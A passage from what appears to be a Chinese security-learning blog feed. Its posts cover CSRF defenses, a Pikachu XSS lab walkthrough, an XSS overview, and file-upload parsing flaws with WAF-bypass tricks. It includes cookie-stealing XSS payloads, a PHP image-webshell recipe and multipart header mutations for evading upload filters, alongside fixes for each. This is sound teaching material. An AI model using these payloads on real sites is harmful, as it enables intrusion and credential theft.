title="CSRF防御"></a>CSRF防御</h1><h2 id="验证HTTP-Referer字段"><a href="#验证HTTP-Referer字段" class="headerlink" title="验证HTTP Referer字段"></a>验证HTTP Referer字段</h2><ul><li>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址 。</li><li>在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问<code> http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆 <code>bank.example</code>，然后通过点击页面上的按钮来触发转账事件。</li><li>因此，要防御 CSRF 攻击，网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</li></ul><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ol><li>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以 篡改 Referer 值 。如果网站支持IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</li><li>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</li></ol><h2 id="在请求地址中添加-token-并验证"><a href="#在请求地址中添加-token-并验证" class="headerlink" title="在请求地址中添加 token 并验证"></a>在请求地址中添加 token 并验证</h2><ul><li>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。</li><li>要抵御 CSRF，关键在于<strong>在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中</strong>。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token（令牌），并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</li></ul><h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><ul><li>这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成<code> http://url?csrftoken=tokenvalue</code>。 而对于 POST 请求来说，要在 form 的最后加上 ，这样就把 token 以参数的形式加入请求了。</li></ul><h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><ol><li>但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很<strong>麻烦</strong>的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</li><li>该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</li></ol><h2 id="在-HTTP-头中自定义属性并验证"><a href="#在-HTTP-头中自定义属性并验证" class="headerlink" title="在 HTTP 头中自定义属性并验证"></a>在 HTTP 头中自定义属性并验证</h2><ul><li>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</li></ul><h3 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h3><ol><li>然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。</li><li>另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</li></ol><h1 id="WAF防御CSRF"><a href="#WAF防御CSRF" class="headerlink" title="WAF防御CSRF"></a>WAF防御CSRF</h1><ul><li>以上防御是技术层面的讨论。实际中进行 CSRF 防护的是使用 <strong>WAF</strong>（Web应用防火墙，如免费的ShareWAF）。因为 CSRF 只是众多web攻击中的一种，网络攻击还有很多种。WAF可以低于绝大多数的攻击，可极大的提高网站安全性。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> csrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu-XSS跨站脚本攻击练习</title>
      <link href="/2023/10/12/Pikachu-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E7%BB%83%E4%B9%A0/"/>
      <url>/2023/10/12/Pikachu-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ul><li>概述就直接看看pikachu的说法吧<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012223925.png" alt="image.png"></li></ul><h1 id="第一关-反射型xss-get"><a href="#第一关-反射型xss-get" class="headerlink" title="第一关 反射型xss(get)"></a>第一关 反射型xss(get)</h1><ul><li>尝试输入以下内容<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;Hello World&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012224340.png" alt="image.png"></li><li>发现有长度限制</li><li>所以我们需要使用其他方法</li></ul><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><ul><li>可以随便输入点东西，然后在url当中插入我们的语句，这样就不受限制了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012224626.png" alt="image.png"></li></ul><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><ul><li>第二个方法就是需要使用开发者工具，修改html代码当中的限制<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012224735.png" alt="image.png"></li><li>直接修改<code>maxlength</code>的值</li><li>然后就可以在输入框当中输入了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012224849.png" alt="image.png"></li></ul><h1 id="第二关-反射型xss-post"><a href="#第二关-反射型xss-post" class="headerlink" title="第二关 反射型xss(post)"></a>第二关 反射型xss(post)</h1><ul><li>是一个登录界面</li><li>pikachu的默认用户名是admin，默认密码是123456</li><li>通过前面暴力破解可以得到用户名和密码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012225519.png" alt="image.png"></li><li>这关没有输入框长度限制，我们获取admin的cookie</li><li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012225617.png" alt="image.png"></li></ul><h1 id="第三关-存储型xss"><a href="#第三关-存储型xss" class="headerlink" title="第三关 存储型xss"></a>第三关 存储型xss</h1><ul><li><p>是个评论系统，输入的内容会被保存在下面<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012225808.png" alt="image.png"></p></li><li><p>我们在评论框当中输入<code>&lt;script&gt;alert(&quot;交出你的cookie&quot;);alert(document.cookie)&lt;/script&gt;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012230112.png" alt="image.png"></p></li><li><p>成功弹出窗口<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012230257.png" alt="image.png"></p></li><li><p>在html代码当中可以看到，我们输入的代码被保存下来了，只要每次打开网页，都会弹出这个弹窗<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012230405.png" alt="image.png"></p></li><li><p>换个浏览器打开也是如此</p></li><li><p>说明存储型xss攻击能危害所以访问受影响页面的用户</p></li></ul><h1 id="第四关-DOM型xss"><a href="#第四关-DOM型xss" class="headerlink" title="第四关 DOM型xss"></a>第四关 DOM型xss</h1><ul><li>在输入看输入发现都是显示<code>what do you see?</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012231745.png" alt="image.png"></li><li>通过开发者工具搜索查到</li><li>其实下面已经有提示了</li><li>代码的意思是会把用户提交的内容输出到<code>&lt;a&gt;</code>标签中，<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012232246.png" alt="image.png"></li><li>我们在输入框输入<code>&#39; onclick=&quot;alert(&#39;Hello World&#39;) &quot;&gt;</code></li><li><code>&#39;</code>的目的是将href闭合，然后后面输入的onclick意思是需要鼠标点击触发<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012234124.png" alt="image.png"></li></ul><h1 id="第五关-DOM型xss-x"><a href="#第五关-DOM型xss-x" class="headerlink" title="第五关 DOM型xss-x"></a>第五关 DOM型xss-x</h1><ul><li>在输入框输入123，发现在url当中出现了，没有回显<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012234404.png" alt="image.png"></li><li>使用开发者工具看看代码</li><li>可以看出需要点击<code>有些费尽心机想要忘记的事情,后来真的就忘掉了</code>这句话才能触发<code>domxss()</code></li><li>再看看<code>domxss()</code>，和第四题一样<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012234554.png" alt="image.png"></li><li>输入<code>&#39; onclick=&quot;alert(&#39;Hello World&#39;) &quot;</code>到输入框</li><li>点击按钮之后，点击下方蓝字就会出现新的一行字</li><li>再点击新一行字就可以出发弹窗了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012234956.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> pikachu </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS跨站脚本攻击漏洞</title>
      <link href="/2023/10/10/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/10/10/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS介绍"><a href="#XSS介绍" class="headerlink" title="XSS介绍"></a>XSS介绍</h1><h2 id="什么是跨站脚本攻击"><a href="#什么是跨站脚本攻击" class="headerlink" title="什么是跨站脚本攻击"></a>什么是跨站脚本攻击</h2><ul><li>跨站脚本攻击（Cross-site scripting，XSS）是一种常见的网络安全漏洞，攻击者通过在受害网站注入恶意脚本代码，使得其他用户访问该网站时执行这些恶意代码，从而达到攻击的目的。</li></ul><h2 id="有什么危害"><a href="#有什么危害" class="headerlink" title="有什么危害"></a>有什么危害</h2><ul><li>获取用户信息：(如浏览器信息、ip地址、cookie信息等）</li><li>钓鱼：(利用xss漏洞构造出一个登录框，骗取用户账户密码，提示登录过期，模拟一个网站的登录框，将用户名、密码发送到攻击者服务器）</li><li>注入木马或广告链接：(有些在主站注入非法网站的链接，对公司的声誉有一定的影响)·</li><li>后台增删改网站数据等操作：(配合CSR漏洞，骗取用户点击，利用s模拟浏览器发包）</li><li>xss蠕虫(微博蠕虫：只要看过某人的微博就是自动关注某人；贴吧蠕虫：看过某个帖子就是自动回复这个帖子)</li></ul><h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="反射型XXS"><a href="#反射型XXS" class="headerlink" title="反射型XXS"></a>反射型XXS</h2><ul><li>反射型XSS，又称<strong>非持久型XSS</strong>，攻击相对于受害者而言是一次性的，具体表现在受害者点击了含有的恶意JavaScript脚本的url，恶意代码并没有保存在目标网站，而Web应用程序只是不加处理的把该恶意脚本“反射”回受害者的浏览器而使受害者的浏览器执行相应的脚本。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010231118.png" alt="image.png"></li></ul><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol><li>即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；</li><li>攻击者需要诱骗点击；</li><li>反馈率低，所以较难发现和响应修复；</li><li>盗取用户敏感保密信息。</li></ol><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><ul><li>存储型XSS，又称<strong>持续型XSS</strong>，是指应用程序通过Web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库。当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行XSS代码持续攻击用户。存储型XSS漏洞大多出现在留言板、评论区，用户提交了包含XSS代码的留言到数据库，当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010231135.png" alt="image.png"></li></ul><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ol><li>持久性，植入在数据库中；</li><li>危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；</li><li>盗取用户敏感私密信息。</li></ol><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><ul><li>DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式，DOM-XSS简单理解就是不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010231149.png" alt="image.png"></li></ul><h1 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1><h2 id="对输入和URL参数进行过滤-白名单和黑名单"><a href="#对输入和URL参数进行过滤-白名单和黑名单" class="headerlink" title="对输入和URL参数进行过滤(白名单和黑名单)"></a>对输入和URL参数进行过滤(白名单和黑名单)</h2><p>检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、“等，发现存在特殊字符，将这些特殊字符过滤或者编码。</p><h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><p>字符串js编码转换成实体html编码的方法（防范XSS攻击）<br><a href="https://www.cnblogs.com/dearxinli/p/5466286.html">https://www.cnblogs.com/dearxinli/p/5466286.html</a></p><h2 id="对输出内容进行编码"><a href="#对输出内容进行编码" class="headerlink" title="对输出内容进行编码"></a>对输出内容进行编码</h2><p>在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web漏洞文件上传（2）</title>
      <link href="/2023/10/10/Web%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%882%EF%BC%89/"/>
      <url>/2023/10/10/Web%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%882%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="解析漏洞解释"><a href="#解析漏洞解释" class="headerlink" title="解析漏洞解释"></a>解析漏洞解释</h2><ul><li>解析漏洞就是指服务器应用程序在解析某些精心构造的后缀文件的时候，会将相关的文件解析成网页的脚本，从而导致实现控制网站，同时大部分的解析漏洞都是由应用程序产生的。</li></ul><h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><h3 id="IIS5-0-6-0"><a href="#IIS5-0-6-0" class="headerlink" title="IIS5.0&#x2F;6.0"></a>IIS5.0&#x2F;6.0</h3><h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h4><ul><li>在以<code>. asp</code>文件名的文件夹下的任何文件都将作为asp文件执行。</li><li>也就是当目录为<code>XX.asp</code>的时候，那么当访问下面的图片的时候，如<code>XX.aps/1.jpg</code>就会被当作ASP执行。</li></ul><h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><ul><li>如果文件为<code>1.asp;.jpg</code>，由于IIS不解析;后面的内容，使用就会把文件当作1.asp进行解析，同时还存在<code>.asa</code>、<code>.cer</code>、<code>.cdx</code>可以进行解析。</li></ul><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>限制上传目录的执行权限，不允许执行脚本。</li><li>不允许创建目录。</li><li>上传的文件进行重命名。</li></ol><h3 id="IIS7-0-7-5"><a href="#IIS7-0-7-5" class="headerlink" title="IIS7.0&#x2F;7.5"></a>IIS7.0&#x2F;7.5</h3><h4 id="IIS7-0-IIS7-0Fash-CGI"><a href="#IIS7-0-IIS7-0Fash-CGI" class="headerlink" title="IIS7.0&#x2F;IIS7.0Fash-CGI"></a>IIS7.0&#x2F;IIS7.0Fash-CGI</h4><ul><li>在Fast-CGI开启的状态下，在类似1.jpg后面加上&#x2F;1.php,变成&#x2F;1.jpg&#x2F;1.php路径会解析成PHP文件。需要进入php.ini里面修改cig.cgi_ pathinfo&#x3D;1。</li><li>将1.txt文本文件中的后门代码写入到1.jpg图片的二进制代码：<code>copy 1.jpg/b + 1.txt/a 1.jpg</code></li><li>1.txt的文件内容为：<code>&lt;?PHPfputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[password])?&gt;&#39;);?&gt;</code></li><li>当在图片文件中写入后门代码，当访问这个图片的时候加上&#x2F;.php的时候就会在当前目录下生成一句话木马shell.php。</li></ul><h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><ul><li>配置cgi.fix_pathinfo(php.ini中)为0并重启php-cgi程序</li></ul><h2 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h2><h3 id="apache解析漏洞-1"><a href="#apache解析漏洞-1" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h3><ul><li>在apache1.x和apache2.x中存在解析漏洞。</li><li>当一个文件为1.php.yy.xx的时候就会被当作php执行，这是由于在apache解析文件的时候有一个原则就是，以.后面的扩展名来解析，当遇见不认识的扩展名的时候，就会向前解析，直到遇到能够解析的后缀名为止。</li><li>如：1.php.yy.xx，首先会解析xx，xx无法解析就会去解析yy，yy无法解析就会去解析php，那么php是能够解析了，那么就会结束。</li><li>这种方式多用于绕过黑名单的检查。</li></ul><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><ol><li>更新至最新版本。</li><li>将上传的文件进行重命名。</li></ol><h2 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h2><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx&lt;8.03"></a>nginx&lt;8.03</h3><h4 id="nginx配置文件错误"><a href="#nginx配置文件错误" class="headerlink" title="nginx配置文件错误"></a>nginx配置文件错误</h4><ul><li>由于nginx默认是用cgi解析php的，因此和iis一样可以制作图片马进行上传。</li><li>当在图片文件中写入后门代码，当访问这个图片的时候加上&#x2F;.php的时候就会在当前目录下生成一句话木马shell.php。</li></ul><h4 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>配置cgi.fix_pathinfo(php.ini中)为0并重启php-cgi程序</li><li>或如果需要使用到cgi.fix_pathinfo这个特性（例如：Wordpress），那么可以禁止上传目录的执行脚本权限。 或将上传存储的内容与网站分离，即站库分离。</li><li>或高版本PHP提供了security.limit_extensions这个配置参数，设置security.limit_extensions &#x3D; .php</li></ol><h3 id="nginx0-5-0-6-0-7"><a href="#nginx0-5-0-6-0-7" class="headerlink" title="nginx0.5&#x2F;0.6&#x2F;0.7&lt;&#x3D;0.7.65&#x2F;0.8&lt;&#x3D;0.8.37"></a>nginx0.5&#x2F;0.6&#x2F;0.7&lt;&#x3D;0.7.65&#x2F;0.8&lt;&#x3D;0.8.37</h3><h4 id="nginx空字节任意代码执行"><a href="#nginx空字节任意代码执行" class="headerlink" title="nginx空字节任意代码执行"></a>nginx空字节任意代码执行</h4><ul><li>当使用PHP-FastCGI执行PHP时，遇到url里面存在%00空字节时与FastCGI的处理不一致，导致可在非PHP文件中嵌入PHP代码，通过访问url+%00.PHP来执行其中的PHP代码。</li><li>比如上传一张图片马1.jpg，那么当访问这个图片马的时在1.jpg后面添加%00.php就会将图片马以php执行。</li></ul><h4 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>升级nginx版本。</li></ol><h1 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h1><ul><li>编辑器也就是在线的web编辑器，比如在搭建博客后需要发布文章，那么用来发布文章的界面就是web编辑器。当然web编辑器有很多，如：UEDITOR（百度）、eWebEdit、FCKeditor、CKEditor（新版fck）、Kindeditor、DotNetTextBox、CuteEditor等等。</li></ul><h1 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h1><h2 id="WAF绕过解释"><a href="#WAF绕过解释" class="headerlink" title="WAF绕过解释"></a>WAF绕过解释</h2><ul><li>waf绕过其实就是将数据包截获到，对里面的内容进行解析，比如对文件的后缀名就判断是否在相应的黑名单中，文件内容中是否存在webshell代码。</li><li>总的来说文件上传都是在数据包中进行各种操作来进行绕过。</li></ul><h2 id="上传参数名解析"><a href="#上传参数名解析" class="headerlink" title="上传参数名解析"></a>上传参数名解析</h2><ul><li><code>Content-Disposition</code>：一般可更改</li><li><code>name</code>：表单参数值，不能更改</li><li><code>filename</code>：文件名，可以更改</li><li><code>Content-Type</code>：文件MIME，视情况更改</li></ul><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><h4 id="form-data与name之间"><a href="#form-data与name之间" class="headerlink" title="form-data与name之间"></a>form-data与name之间</h4><ul><li>在form-data;与name&#x3D;”upload_file”; filename&#x3D;”2.php”之间添加大量的垃圾数据，可以边添加边测试直到上传上去，主要添加的垃圾数据需要在后面添加一个”;”进行结尾。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010204737.png" alt="image.png"></li></ul><h4 id="name与filename之间"><a href="#name与filename之间" class="headerlink" title="name与filename之间"></a>name与filename之间</h4><ul><li>当然这里不单单可以插入在form-data;与name&#x3D;”upload_file”; filename&#x3D;”2.php”之间，也可以在name&#x3D;”upload_file”; 与filename&#x3D;”2.php”之间。但是数据不能乱插入，比如你插在2.php中，那肯定不行，一般情况下，文件名称长度都可能存在限制，并且太长也上传不上去。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010205005.png" alt="image.png"></li></ul><h3 id="符号变异"><a href="#符号变异" class="headerlink" title="符号变异"></a>符号变异</h3><ul><li>符号变异也就是将单双引号变换使用，或者单双引号缺失一部分进行使用，或者不使用单双引号来进行绕过。目前测试好像是无法通过了。</li></ul><h4 id="filename符号变异"><a href="#filename符号变异" class="headerlink" title="filename符号变异"></a>filename符号变异</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;2.php</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&#x27;2.php</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=2.php</span><br></pre></td></tr></table></figure><h4 id="form-data符号变异"><a href="#form-data符号变异" class="headerlink" title="form-data符号变异"></a>form-data符号变异</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition:&quot;form-data&quot;; name=upload_file; filename=&quot;2.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Disposition:&#x27;form-data&#x27;; name=&quot;upload_file&quot;; filename=&#x27;2.php&#x27;</span><br></pre></td></tr></table></figure><h3 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a>数据截断</h3><h4 id="回车换行"><a href="#回车换行" class="headerlink" title="回车换行"></a>回车换行</h4><ul><li>通过换行来实现绕过，但是中间不能有空行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010205522.png" alt="image.png"></li></ul><h4 id="分号截断"><a href="#分号截断" class="headerlink" title="分号截断"></a>分号截断</h4><ul><li>若WAF匹配文件名到分号截止，则可以绕过。</li></ul><h3 id="字段名变换"><a href="#字段名变换" class="headerlink" title="字段名变换"></a>字段名变换</h3><h4 id="大小写变换"><a href="#大小写变换" class="headerlink" title="大小写变换"></a>大小写变换</h4><ul><li>对这三个字段进行大小写进行变换，比如将<code>name</code>换成<code>Name</code>、<code>Content-Disposition</code>换成<code>content-disposition</code>等等。</li></ul><h4 id="顺序颠倒"><a href="#顺序颠倒" class="headerlink" title="顺序颠倒"></a>顺序颠倒</h4><ul><li>针对<code>name</code>和<code>filename</code>这两个字段，我们可以尝试交换<code>name</code>和<code>filename</code>的顺序。（由于有规定<code>Content-Dispositon</code>必须在前面，因此我们不能修改该字段的内容）</li></ul><h3 id="重复数据"><a href="#重复数据" class="headerlink" title="重复数据"></a>重复数据</h3><ul><li>通过设置多个参数进行匹配，避免被匹配到。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;;filename=&quot;2.jpg&quot;;filename=&quot;2.jpg&quot;;filename=&quot;2.jpg&quot;;filename=&quot;2.jpg&quot;;......filename=&quot;2.php&quot;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>比较全的文件上传漏洞WAF拦截绕过总结：<a href="https://cloud.tencent.com/developer/article/1944142">https://cloud.tencent.com/developer/article/1944142</a></li></ul><h1 id="文件上传修复"><a href="#文件上传修复" class="headerlink" title="文件上传修复"></a>文件上传修复</h1><ul><li>后端验证：针对后端验证的可以采用通过服务器进行验证。</li><li>后缀检测：利用黑白名单进行过滤，当然最好是使用白名单，黑名单有时候总归会存在一些未想到的后缀，而白名单就相对简单一点，只需要想放通哪些后缀即可，而且防范更好一些。</li><li>上传目录：对上传文件到的目录可以设置一个不可执行的权限。</li><li>文件名：针对文件名可以自定义一些随机数以及一些其他的内容进行二次修改，从而改变文件的名称。</li><li>内容检测：可以使用文件头，完整性检测，最好能够对内容的数据进行判断是否存在一些webxshll类似的代码，若出现这类代码，直接删除。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web漏洞文件上传</title>
      <link href="/2023/10/08/Web%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
